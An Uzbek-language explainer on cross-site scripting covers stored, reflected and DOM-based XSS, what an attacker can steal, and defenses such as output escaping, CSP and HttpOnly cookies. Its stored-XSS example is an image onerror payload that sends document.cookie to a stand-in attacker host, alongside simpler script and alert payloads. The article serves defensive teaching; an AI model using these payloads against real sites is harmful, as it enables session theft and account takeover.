---
title: XSS nima: saytlararo skripting turlari va hujum misollari
description: Saqlanadigan, aks ettirilgan va DOM-based XSS oddiy misollarda: zararli skript sahifaga qanday tushadi, nimani o‘g‘irlaydi va chiqishni qanday ekranlash kerak.
summary: XSS — begona JavaScript sizning saytingizda foydalanuvchi brauzerida bajariladigan zaiflik. Asosiy himoya — har qanday ma’lumotni chiqarishda kontekstga qarab ekranlash: HTML, atribut, URL yoki skript.
---

## XSS nima

**XSS (Cross-Site Scripting, saytlararo skripting)** — hujumchi sizning saytingiz orqali foydalanuvchiga o‘zining JavaScript kodini ko‘rsatadigan zaiflik. Brauzer bu kodni siznikidan ajrata olmaydi va uni xuddi shunday huquqlar bilan bajaradi: sahifaga, ma’lumotlarga kirish va foydalanuvchi nomidan amallar.

Sabab deyarli har doim bitta: foydalanuvchidan kelgan ma’lumot HTML’ga **ekranlanmasdan** tushadi va brauzer uni belgilash yoki kod sifatida qabul qiladi.

## XSS ning uch turi

| Turi | Payload qayerda saqlanadi | Qurbon uni qanday oladi |
|---|---|---|
| **Saqlanadigan (stored)** | Ma’lumotlar bazasida | Zararlangan kontentli oddiy sahifani ochadi |
| **Aks ettirilgan (reflected)** | Havola yoki so‘rovda | Tayyorlangan havolaga o‘tadi |
| **DOM-based** | Faqat brauzerda qayta ishlanadi | Sahifaning o‘z JavaScript’i ma’lumotni DOM’ga qo‘yadi |

### Saqlanadigan XSS

Hujumchi izoh qoldiradi:

```html
<img src="x" onerror="fetch('https://evil.example/c?d='+document.cookie)">
```

Agar sayt izohni HTML sifatida chiqarsa, kod sahifani ochgan har bir kishida, jumladan administratorda ham bajariladi. Bu eng xavfli tur: hujum hujumchining ishtirokisiz ishlaydi.

### Aks ettirilgan XSS

Qidiruv sahifasi so‘rovni chiqaradi: «So‘rov bo‘yicha natijalar: …». Hujumchi qurbonga havola yuboradi:

```text
https://shop.example/search?q=<script>/* zararli kod */</script>
```

Server parametrni javobga «aks ettiradi» va skript bajariladi. Havola qisqartiruvchi xizmat yoki xatdagi tugma ortiga yashiriladi.

### DOM-based XSS

Bu yerda server aybdor emas — klient kodi zaif:

```js
// zaif: manzildagi ma’lumot HTML sifatida qo‘yiladi
document.getElementById("greeting").innerHTML = location.hash.slice(1);
```

`page.html#<img src=x onerror=alert(1)>` ko‘rinishidagi havola kodni ishga tushiradi. Xavfli joylar: `innerHTML`, `outerHTML`, `document.write`, `eval`, satr bilan `setTimeout`.

## Hujumchi nimani o‘g‘irlashi mumkin

Skript saytingiz kontekstida ishlaydi, shuning uchun u:

- **Sessiyani o‘g‘irlaydi**, agar cookie `HttpOnly` bilan belgilanmagan bo‘lsa, yoki `localStorage` dagi tokenlarni oladi.
- **Foydalanuvchi nomidan harakat qiladi:** email va parolni o‘zgartiradi, pul o‘tkazadi, kontent joylaydi.
- **Sahifadagi ma’lumotlarni o‘qiydi:** shaxsiy xabarlar, to‘lov ma’lumotlari, hujjatlar.
- **Interfeysni almashtiradi:** haqiqiy domenda soxta kirish formasini ko‘rsatadi.
- **Klavishalar bosilishini yozib oladi** va o‘z serveriga yuboradi.

## Himoya tamoyillari

### Kontekstga qarab chiqishni ekranlash

Asosiy qoida: ma’lumotni faqat kiritishda «tozalash» emas, balki **chiqarishda ekranlash**. Usul ma’lumot qayerga tushishiga bog‘liq:

| Kontekst | Nima qilish kerak |
|---|---|
| HTML ichidagi matn | `<`, `>`, `&`, `"`, `'` ni HTML-obyektlarga almashtirish |
| Atribut qiymati | Har doim qo‘shtirnoqda, ustiga HTML-ekranlash |
| `href`/`src` dagi URL | Parametrlar uchun `encodeURIComponent`, faqat `http:` va `https:` ga ruxsat |
| `<script>` ichida | Ma’lumotni to‘g‘ridan-to‘g‘ri qo‘ymaslik; JSON yoki data-atributlar orqali uzatish |
| CSS | Uslublarda foydalanuvchi ma’lumotlaridan qochish |

Zamonaviy shablonizatorlar va freymvorklar (Jinja2, Blade, React, Angular) matnni standart holatda ekranlaydi. Zaifliklar buni qo‘lda o‘chirib qo‘yganda paydo bo‘ladi.

### Qo‘shimcha qatlamlar

- **HTML sanitayzer** (masalan, DOMPurify) — agar foydalanuvchiga haqiqatan belgilashga ruxsat berish kerak bo‘lsa.
- **Content Security Policy** — inline skriptlarni va begona domenlardan kod yuklashni taqiqlaydi.
- **`HttpOnly`, `Secure`, `SameSite` bayroqli cookie** — skript sessiyani o‘qiy olmaydi.
- **Kiritishni validatsiya qilish** — foydali, lekin ekranlash o‘rnini bosmaydi.

## Ko‘p uchraydigan xatolar

- «script so‘zini o‘chirish» kabi qora ro‘yxatlar — ularni hodisa atributlari va boshqa teglar orqali oson aylanib o‘tish mumkin.
- Ma’lumot URL yoki JavaScript’ga tushadigan joyda HTML-ekranlashdan foydalanish.
- «O‘zimizning» manbalardan kelgan ma’lumotlarga ishonish: admin panel, CRM, tashqi API’lar.

## FAQ

### Saytda formalar bo‘lmasa, XSS bo‘lishi mumkin emasmi?

Mumkin. Ma’lumotlar nafaqat formalardan keladi: URL parametrlari, manzil xeshi, sarlavhalar, tashqi API javoblari, import qilingan fayllar.

### HTTPS XSS dan himoya qiladimi?

Yo‘q. HTTPS kanalni shifrlaydi, lekin zararli skript aynan sizning saytingizdan o‘sha himoyalangan ulanish orqali keladi.

### Self-XSS nima?

Bu foydalanuvchini brauzer konsoliga kod qo‘yishga ko‘ndirish. Texnik jihatdan bu sayt zaifligi emas, balki ijtimoiy muhandislik, lekin konsoldagi ogohlantirish yordam beradi.
